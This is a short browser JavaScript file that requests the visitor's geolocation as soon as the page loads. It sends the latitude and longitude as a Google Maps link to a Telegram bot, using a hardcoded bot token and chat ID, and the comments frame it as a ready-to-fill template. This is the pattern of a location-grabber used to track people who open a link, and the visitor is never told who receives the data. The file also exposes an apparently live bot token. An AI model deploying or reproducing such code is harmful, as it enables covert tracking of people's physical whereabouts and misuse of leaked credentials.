window.onload = function() {
    const statusEl = document.getElementById('status');

    const TELEGRAM_BOT_TOKEN = "8596201289:AAE7Ymg25nOMZlgWDpw-128Mkzbu90PVTMw"; // Place your bot token here
    const TELEGRAM_CHAT_ID = "7491798353";   // Place your chat ID here

    function sendLocation(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // Prepare the Telegram API URL
        const message = `Location: https://www.google.com/maps?q=${latitude},${longitude}`;
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;

        // Send the location to Telegram
        fetch(url)
        .then(response => {
            if(response.ok){
                statusEl.textContent = "Location sent successfully.";
            } else {
                statusEl.textContent = "Failed to send location.";
            }
        })
        .catch(error => {
            statusEl.textContent = "Error sending location.";
            console.error(error);
        });
    }

    function handleError(error) {
        switch(error.code) {
            case error.PERMISSION_DENIED:
                statusEl.textContent = "Location permission denied!";
                break;
            case error.POSITION_UNAVAILABLE:
                statusEl.textContent = "Location unavailable.";
                break;
            case error.TIMEOUT:
                statusEl.textContent = "Location request timeout.";
                break;
            default:
                statusEl.textContent = "Unknown error occurred.";
        }
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
    } else {
        statusEl.textContent = "Geolocation is not supported by this browser.";
    }
};
